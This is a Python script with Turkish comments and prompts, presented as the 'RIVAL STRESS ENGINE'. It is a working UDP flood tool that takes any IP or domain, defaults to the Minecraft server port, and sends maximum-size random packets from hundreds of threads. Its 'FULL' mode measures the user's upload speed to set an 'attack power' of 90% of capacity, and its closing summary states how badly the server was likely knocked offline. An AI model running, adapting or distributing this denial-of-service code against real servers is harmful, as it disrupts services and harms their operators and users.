import socket
import threading
import time
import sys
from datetime import datetime
import os
import subprocess

# Windows terminal için UTF-8 encoding
if sys.platform == 'win32':
    import ctypes
    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    sys.stdout.reconfigure(encoding='utf-8')
    sys.stderr.reconfigure(encoding='utf-8')

# Renkler (Windows için)
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'
    
    # Arka plan renkleri
    BG_RED = '\033[41m'
    BG_BLACK = '\033[40m'

# İstatistikler için global değişkenler
total_sent = 0
total_failed = 0
lock = threading.Lock()

def clear_screen():
    """Ekranı temizle"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """RIVAL ASCII art banner - Cyber Edition"""
    clear_screen()
    
    banner = f"""{Colors.BOLD}
\033[38;5;51m    ██████╗ {Colors.RESET}\033[38;5;87m██╗{Colors.RESET}\033[38;5;123m██╗   ██╗{Colors.RESET}\033[38;5;159m █████╗ {Colors.RESET}\033[38;5;195m██╗     {Colors.RESET}
\033[38;5;45m    ██╔══██╗{Colors.RESET}\033[38;5;81m██║{Colors.RESET}\033[38;5;117m██║   ██║{Colors.RESET}\033[38;5;153m██╔══██╗{Colors.RESET}\033[38;5;189m██║     {Colors.RESET}
\033[38;5;39m    ██████╔╝{Colors.RESET}\033[38;5;75m██║{Colors.RESET}\033[38;5;111m██║   ██║{Colors.RESET}\033[38;5;147m███████║{Colors.RESET}\033[38;5;183m██║     {Colors.RESET}
\033[38;5;33m    ██╔══██╗{Colors.RESET}\033[38;5;69m██║{Colors.RESET}\033[38;5;105m╚██╗ ██╔╝{Colors.RESET}\033[38;5;141m██╔══██║{Colors.RESET}\033[38;5;177m██║     {Colors.RESET}
\033[38;5;27m    ██║  ██║{Colors.RESET}\033[38;5;63m██║{Colors.RESET}\033[38;5;99m ╚████╔╝ {Colors.RESET}\033[38;5;135m██║  ██║{Colors.RESET}\033[38;5;171m███████╗{Colors.RESET}
\033[38;5;21m    ╚═╝  ╚═╝{Colors.RESET}\033[38;5;57m╚═╝{Colors.RESET}\033[38;5;93m  ╚═══╝  {Colors.RESET}\033[38;5;129m╚═╝  ╚═╝{Colors.RESET}\033[38;5;165m╚══════╝{Colors.RESET}

\033[38;5;196m ⚡ ───────────────────────────────────────────────────────────── ⚡{Colors.RESET}
\033[38;5;196m │{Colors.RESET}                  \033[38;5;226m{Colors.BOLD}⚡ RIVAL STRESS ENGINE ⚡{Colors.RESET}                  \033[38;5;196m│{Colors.RESET}
\033[38;5;196m │{Colors.RESET}                \033[38;5;208mDeveloped by \033[38;5;51m{Colors.BOLD}ADAZ_TR{Colors.RESET}                \033[38;5;196m│{Colors.RESET}
\033[38;5;196m ⚡ ───────────────────────────────────────────────────────────── ⚡{Colors.RESET}

\033[38;5;240m[{Colors.RESET}\033[38;5;196m🛡️ {Colors.RESET}\033[38;5;240m]{Colors.RESET} \033[38;5;244mUYARI: Maksimum hız için Yönetici Olarak Çalıştırın!{Colors.RESET}
"""
    print(banner)

def send_requests(target_ip, target_port, packet_size, duration, thread_id):
    """Her thread için istek gönderen fonksiyon - MAXIMUM PERFORMANS"""
    global total_sent, total_failed
    
    end_time = time.time() + duration
    sent_count = 0
    failed_count = 0
    
    # Gönderilecek veriyi oluştur (Dataları her seferinde oluşturma)
    data = os.urandom(packet_size)
    
    try:
        # UDP socket oluştur
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Windows için buffer boyutunu devasa yapalım
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024) # 2MB buffer
        except: pass

        # BAĞLANTI KUR: Bu, paket gönderimini hızlandırır (WSAConnect)
        # Hedefe 'connect' yapmak UDP'de paketleri daha hızlı sıraya sokar
        sock.connect((target_ip, target_port))
        
        while time.time() < end_time:
            try:
                # MAXIMUM HIZ - LOOPBACK İÇİN AYARLANMIŞ
                bytes_sent = sock.send(data)
                if bytes_sent > 0:
                    sent_count += 1
                
                # Yerel testlerde (loopback) diğer işlemlere izin ver
                if target_ip == '127.0.0.1' or target_ip == 'localhost':
                    time.sleep(0.0001) 
            except (BlockingIOError, socket.error):
                time.sleep(0.001)
                continue
            except Exception:
                failed_count += 1
        
        sock.close()
    except Exception as e:
        print(f"\033[38;5;196m[Thread {thread_id}] Hata: {e}{Colors.RESET}")
    
    # Global istatistikleri güncelle
    with lock:
        total_sent += sent_count
        total_failed += failed_count
    
    print(f"\033[38;5;240m[Thread {thread_id}]\033[38;5;46m ✅ {sent_count:,}{Colors.RESET} paket")

def monitor_progress(duration):
    """İşlem süresince ilerlemeyi göster"""
    start_time = time.time()
    while time.time() - start_time < duration:
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        
        with lock:
            pps = total_sent / max(elapsed, 1)
        
        # Progress bar - Premium gradient
        progress = int((elapsed / duration) * 40)
        filled = '█' * progress
        empty = '░' * (40 - progress)
        bar = f"\033[38;5;46m{filled}\033[38;5;240m{empty}{Colors.RESET}"
        
        print(f"\r\033[38;5;51m⏱️  \033[38;5;226m{elapsed}s\033[38;5;240m/\033[38;5;226m{duration}s {Colors.RESET}[{bar}] \033[38;5;208m📊 \033[38;5;226m{total_sent:,}{Colors.RESET} paket \033[38;5;201m📈 \033[38;5;51m{pps:,.0f} pps{Colors.RESET}", end="")
        time.sleep(1)
    print()  # Yeni satır

def check_connection(target_ip, target_port):
    """Hedefin ulaşılabilir olup olmadığını kontrol et"""
    print(f"\n{Colors.CYAN}🔍 Bağlantı kontrolü yapılıyor...{Colors.RESET}")
    
    try:
        # DNS çözümleme
        resolved_ip = socket.gethostbyname(target_ip)
        print(f"{Colors.GREEN}✅ DNS çözümlendi:{Colors.RESET} {Colors.YELLOW}{target_ip}{Colors.RESET} → {Colors.CYAN}{resolved_ip}{Colors.RESET}")
        
        # Paket gönderim kontrolü (UDP)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        check_data = b"CHECK"
        
        start = time.time()
        sock.sendto(check_data, (resolved_ip, target_port))
        latency = (time.time() - start) * 1000
        sock.close()
        
        print(f"{Colors.GREEN}✅ Paket gönderildi ({latency:.2f}ms){Colors.RESET}")
        print(f"{Colors.YELLOW}⚠️  Not: UDP yanıt beklemez, bu normal.{Colors.RESET}\n")
        
        return resolved_ip
        
    except socket.gaierror:
        print(f"{Colors.RED}❌ DNS HATASI: '{target_ip}' çözümlenemedi!{Colors.RESET}")
        return None
    except Exception as e:
        print(f"{Colors.YELLOW}⚠️  Bağlantı kontrolü tamamlanamadı: {e}{Colors.RESET}")
        print(f"{Colors.YELLOW}⚠️  Ancak UDP için bu normal olabilir.{Colors.RESET}\n")
        return target_ip

def main():
    global total_sent, total_failed
    
    # Banner göster
    print_banner()
    print()
    
    # IP adresi al
    target_ip = input(f"\033[38;5;51m[\033[38;5;87m>\033[38;5;51m]{Colors.RESET} \033[38;5;159mHedef IP/Domain: \033[38;5;226m{Colors.RESET}").strip()
    
    # Port al
    port_input = input(f"\033[38;5;51m[\033[38;5;87m>\033[38;5;51m]{Colors.RESET} \033[38;5;159mHedef Port (varsayılan 25565): \033[38;5;226m{Colors.RESET}").strip()
    target_port = int(port_input) if port_input else 25565
    
    # Bağlantı kontrolü
    resolved_ip = check_connection(target_ip, target_port)
    if not resolved_ip:
        print(f"{Colors.RED}❌ Hedef ulaşılamıyor! İşlem iptal edildi.{Colors.RESET}")
        return
    
    # Paket boyutu ve Mod Seçimi
    packet_size = 1024  # Varsayılan
    thread_count = 50   # Varsayılan
    auto_max_mode = False

    while True:
        try:
            print(f"\033[38;5;51m[\033[38;5;87m?\033[38;5;51m]{Colors.RESET} \033[38;5;159mPaket boyutu veya Mod Seçimi: \033[38;5;226m{Colors.RESET}")
            print(f"   \033[38;5;244m└─ \033[38;5;51mSayı \033[38;5;244m(1-65507) veya \033[38;5;196m'FULL'\033[38;5;226m (Tüm Gücü Kullan){Colors.RESET}")
            user_input = input(f"\033[38;5;51m[\033[38;5;87m>\033[38;5;51m]{Colors.RESET} \033[38;5;159mSeçiminiz: \033[38;5;226m{Colors.RESET}").strip().upper()
            
            if user_input == "FULL" or user_input == "MAX":
                # FULL POWER MODE - Akıllı İnternet ve Sistem Analizi
                auto_max_mode = True
                
                print(f"\n\033[38;5;196m⚡ FULL POWER MODU BAŞLATILIYOR...{Colors.RESET}")
                
                # --- 1. SPEEDTEST KÜTÜPHANE KONTROLÜ VE KURULUMU ---
                try:
                    import speedtest
                except ImportError:
                    print(f"\033[38;5;226m   [!] 'speedtest' modülü eksik. Otomatik indiriliyor...{Colors.RESET}")
                    try:
                        subprocess.check_call([sys.executable, "-m", "pip", "install", "speedtest-cli"])
                        import speedtest
                        print(f"\033[38;5;46m   [+] Kurulum başarılı!{Colors.RESET}")
                    except Exception as e:
                        print(f"\033[38;5;196m   [!] Kurulum hatası: {e}. Tahmini mod kullanılıyor.{Colors.RESET}")
                        speedtest = None

                # --- 2. CPU ANALİZİ ---
                cpu_cores = os.cpu_count() or 4
                
                # --- 3. İNTERNET ANALİZİ VE HEDEF BELİRLEME ---
                target_mbps = "Maksimum"
                if speedtest:
                    try:
                        print(f"\033[38;5;51m   [*] İnternet hattı analiz ediliyor (Max 15sn)...{Colors.RESET}")
                        # Hız testi için zaman aşımı ekle - Donmayı önler
                        socket.setdefaulttimeout(15)
                        st = speedtest.Speedtest()
                        st.get_best_server()
                        upload_speed = st.upload() / 1_000_000  # Mbps çeviri
                        
                        target_mbps = int(upload_speed * 0.90) # %90 Hedef
                        print(f"\033[38;5;46m   [+] Ölçülen Upload Hızı:\033[38;5;255m {upload_speed:.2f} Mbps{Colors.RESET}")
                        print(f"\033[38;5;226m   [+] HEDEF SALDIRI GÜCÜ:\033[38;5;196m {target_mbps} Mbps (%90 Kapasite){Colors.RESET}")
                        socket.setdefaulttimeout(None) # Normale döndür
                    except Exception as e:
                        print(f"\033[38;5;226m   [!] Hız testi yapılamadı (Zaman aşımı), maksimum mod kullanılıyor.{Colors.RESET}")
                        socket.setdefaulttimeout(None)

                print(f"\033[38;5;46m   [+] İşlemci:\033[38;5;255m {cpu_cores} Çekirdek Aktif{Colors.RESET}")

                # --- 4. OPTİMİZASYON ---
                # PC'nin donmaması için (Takılmadan çalışması için) optimum limit
                thread_count = cpu_cores * 50 # Çekirdek başına 50 thread idealdir
                if thread_count > 500: thread_count = 500 # 500 üzeri Python için verimsizdir ve kastırır

                
                packet_size = 65500 # UDP Max Payload
                
                print(f"\033[38;5;46m   [+] Paket Yapılandırması:\033[38;5;255m OTOMATİK (Max Bandwidth){Colors.RESET}")
                print(f"\033[38;5;46m   [+] Thread Havuzu:\033[38;5;255m {thread_count} Worker (Optimize Edildi){Colors.RESET}")
                print(f"\033[38;5;196m   [!] DİKKAT: İnternetinizin %90'ı kullanılacak, bağlantınız yavaşlayabilir!{Colors.RESET}")
                break
                
            # Normal Sayısal Giriş
            packet_size = int(user_input or "1024")
            if packet_size > 0 and packet_size <= 65507:
                break
            else:
                print(f"{Colors.RED}Paket boyutu 1 ile 65507 arasında olmalıdır!{Colors.RESET}")
        except ValueError:
            print(f"{Colors.RED}Lütfen geçerli bir sayı girin veya 'FULL' yazın!{Colors.RESET}")
    
    # Thread sayısı al (Sadece Manuel modda sor)
    if not auto_max_mode:
        while True:
            try:
                user_input = input(f"\033[38;5;51m[\033[38;5;87m>\033[38;5;51m]{Colors.RESET} \033[38;5;159mThread sayısı (varsayılan 50): \033[38;5;226m{Colors.RESET}").strip()
                thread_count = int(user_input or "50")
                if 1 <= thread_count <= 1000: # Limiti biraz artırdım manuel giriş için de
                    break
                else:
                    print(f"{Colors.RED}Thread sayısı 1 ile 1000 arasında olmalıdır!{Colors.RESET}")
            except ValueError:
                print(f"{Colors.RED}Lütfen geçerli bir sayı girin!{Colors.RESET}")
    
    # Süre al
    while True:
        try:
            user_input = input(f"\033[38;5;51m[\033[38;5;87m>\033[38;5;51m]{Colors.RESET} \033[38;5;159mİşlem süresi (saniye, varsayılan 30): \033[38;5;226m{Colors.RESET}").strip()
            duration = int(user_input or "30")
            if duration > 0 and duration <= 120:
                break
            else:
                print(f"{Colors.RED}Süre 1 ile 120 saniye arasında olmalıdır!{Colors.RESET}")
        except ValueError:
            print(f"{Colors.RED}Lütfen geçerli bir sayı girin!{Colors.RESET}")
    
    print()
    print(f"\033[38;5;196m{'═' * 63}{Colors.RESET}")
    print(f"\033[38;5;51m🎯 Hedef:{Colors.RESET} \033[38;5;226m{target_ip}{Colors.RESET} (\033[38;5;87m{resolved_ip}{Colors.RESET}):\033[38;5;255m{target_port}{Colors.RESET}")
    print(f"\033[38;5;51m📦 Paket Boyutu:{Colors.RESET} \033[38;5;255m{packet_size:,}{Colors.RESET} byte (\033[38;5;226m{packet_size/1024:.1f} KB{Colors.RESET})")
    print(f"\033[38;5;51m🔀 Thread Sayısı:{Colors.RESET} \033[38;5;255m{thread_count}{Colors.RESET}")
    print(f"\033[38;5;51m⏱️  Süre:{Colors.RESET} \033[38;5;255m{duration}{Colors.RESET} saniye")
    
    # Tahmini yük hesapla
    estimated_pps = thread_count * 1000  # Kaba tahmin
    estimated_mbps = (estimated_pps * packet_size * 8) / 1_000_000
    print(f"\033[38;5;51m📊 Tahmini Yük:{Colors.RESET} \033[38;5;201m~{estimated_pps:,} pps{Colors.RESET}, \033[38;5;201m~{estimated_mbps:.0f} Mbps{Colors.RESET}")
    print(f"\033[38;5;196m{'═' * 63}{Colors.RESET}")
    print()
    
    # Onay al
    confirm = input(f"\033[38;5;226m⚠️  İşleme başlamak için '\033[38;5;46mEVET\033[38;5;226m' yazın: \033[38;5;255m{Colors.RESET}").strip().upper()
    if confirm != "EVET":
        print(f"{Colors.RED}❌ İşlem iptal edildi.{Colors.RESET}")
        return
    
    print()
    print(f"\033[38;5;46m{Colors.BOLD}🚀 İşlem başlatılıyor...{Colors.RESET}")
    print()
    
    # İstatistikleri sıfırla
    total_sent = 0
    total_failed = 0
    
    # Thread'leri başlat
    threads = []
    start_time = time.time()
    
    # Monitoring thread
    monitor_thread = threading.Thread(target=monitor_progress, args=(duration,))
    monitor_thread.start()
    
    # Worker threads
    for i in range(thread_count):
        thread = threading.Thread(
            target=send_requests,
            args=(resolved_ip, target_port, packet_size, duration, i+1)
        )
        thread.start()
        threads.append(thread)
    
    # Tüm thread'lerin bitmesini bekle
    for thread in threads:
        thread.join()
    
    monitor_thread.join()
    
    end_time = time.time()
    elapsed = end_time - start_time
    
    print()
    print(f"\033[38;5;51m{'═' * 63}{Colors.RESET}")
    print(f"\033[38;5;226m{Colors.BOLD}📊 İŞLEM SONUÇLARI{Colors.RESET}")
    print(f"\033[38;5;51m{'═' * 63}{Colors.RESET}")
    print(f"\033[38;5;87m⏱️  Toplam Süre:{Colors.RESET} \033[38;5;255m{elapsed:.2f}{Colors.RESET} saniye")
    print(f"\033[38;5;46m✅ Gönderilen Paket:{Colors.RESET} \033[38;5;226m{total_sent:,}{Colors.RESET}")
    print(f"\033[38;5;196m❌ Başarısız:{Colors.RESET} \033[38;5;255m{total_failed:,}{Colors.RESET}")
    print(f"\033[38;5;201m📈 Ortalama Hız:{Colors.RESET} \033[38;5;51m{total_sent/elapsed:,.0f}{Colors.RESET} paket/saniye")
    
    # Bant genişliği hesapla
    total_bytes = total_sent * packet_size
    total_mb = total_bytes / 1_000_000
    mbps = (total_bytes * 8) / elapsed / 1_000_000
    
    print(f"\033[38;5;87m📦 Toplam Veri:{Colors.RESET} \033[38;5;226m{total_mb:.2f} MB{Colors.RESET}")
    print(f"\033[38;5;87m🌐 Ortalama Bant:{Colors.RESET} \033[38;5;226m{mbps:.2f} Mbps{Colors.RESET}")
    print(f"\033[38;5;51m{'═' * 63}{Colors.RESET}")
    print()
    
    # Analiz - Premium görünüm
    # Analiz - Daha orantılı ve gerçekçi eşikler
    if total_sent > 1000000:
        print(f"\033[38;5;46m{Colors.BOLD}✅ KRİTİK YÜK:{Colors.RESET} \033[38;5;255mSunucu tamamen devre dışı kalmış olmalı!{Colors.RESET}")
    elif total_sent > 500000:
        print(f"\033[38;5;46m{Colors.BOLD}✅ YÜKSEK YÜK:{Colors.RESET} \033[38;5;255mSunucu ciddi şekilde etkilenmiş olmalı!{Colors.RESET}")
    elif total_sent > 100000:
        print(f"\033[38;5;226m{Colors.BOLD}⚠️  ORTA YÜK:{Colors.RESET} \033[38;5;255mSunucu yavaşlamış veya lag başlamış olabilir.{Colors.RESET}")
    else:
        print(f"\033[38;5;196m{Colors.BOLD}❌ DÜŞÜK YÜK:{Colors.RESET} \033[38;5;255mSunucu muhtemelen etkilenmedi.{Colors.RESET}")
    
    if total_failed > total_sent * 0.1:
        print(f"\033[38;5;226m⚠️  Çok fazla hata! Ağ sorunu veya hedef ulaşılamıyor olabilir.{Colors.RESET}")
    
    print()
    input(f"\033[38;5;244mÇıkmak için ENTER'a basın...{Colors.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠️  İşlem kullanıcı tarafından durduruldu!{Colors.RESET}")
        print(f"{Colors.CYAN}📊 Son durum:{Colors.RESET} {Colors.WHITE}{total_sent:,}{Colors.RESET} paket gönderildi")
        print()
        input(f"\033[38;5;244mÇıkmak için ENTER'a basın...{Colors.RESET}")
        sys.exit(0)
